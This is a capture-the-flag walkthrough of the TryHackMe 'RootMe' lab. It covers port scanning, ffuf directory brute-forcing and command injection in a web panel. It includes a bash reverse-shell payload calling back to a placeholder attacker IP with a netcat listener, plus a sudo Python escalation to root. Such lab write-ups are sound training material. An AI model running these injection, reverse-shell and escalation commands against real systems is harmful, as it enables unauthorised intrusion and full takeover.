# TryHackMe RootMe Walkthrough – Command Injection & Privilege Escalation

A step-by-step professional write-up of the "RootMe" room on TryHackMe, covering web enumeration using FFUF, command injection exploitation, and privilege escalation via misconfigured sudo permissions on Python.

---

## Target Information

- **Platform:** TryHackMe  
- **Room:** RootMe  
- **Difficulty:** Easy  
- **IP Address:** `<TARGET-IP>`  
- **Author:** [vgod-sec](https://github.com/vgod-sec)

---

## 1. Initial Enumeration

### Port Scanning

```bash
nmap -sC -sV -oN nmap.txt <TARGET-IP>
```

**Results:**
- Port 22 – OpenSSH  
- Port 80 – Apache Web Server

---

## 2. Web Enumeration with FFUF

```bash
ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403 -t 50
```

**Discovered:** `/panel/`

---

## 3. Command Injection Exploitation

The `/panel/` page contains a vulnerable input field. Testing with:

```bash
; whoami
```

confirms command injection.

### Gaining Reverse Shell

**Listener:**

```bash
nc -lvnp 4444
```

**Payload in input field:**

```bash
; bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1
```

Successfully obtained a shell as `www-data`.

---

## 4. Privilege Escalation

### Sudo Rights Check

```bash
sudo -l
```

**Output:**
```
(root) NOPASSWD: /usr/bin/python
```

### Escalate to Root

```bash
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
```

Now operating as root.

---

## 5. Capture the Flags

```bash
cat /home/*/user.txt
cat /root/root.txt
```

---

## Summary

| Step                  | Technique                                 |
|-----------------------|--------------------------------------------|
| Port Scan             | `nmap` with default scripts               |
| Directory Discovery   | `ffuf` brute-forcing                      |
| Remote Code Execution | Command injection → Bash reverse shell   |
| Privilege Escalation  | `sudo` with Python to gain root access    |

---

## Keywords (SEO)

```
tryhackme rootme walkthrough
command injection tryhackme
sudo python privilege escalation
ffuf directory brute force
tryhackme beginner CTF guide
```

---

## Author

- GitHub: [vgod-sec](https://github.com/vgod-sec)
- LinkedIn: [shivam-thakur1](https://linkedin.com/in/shivam-thakur1)
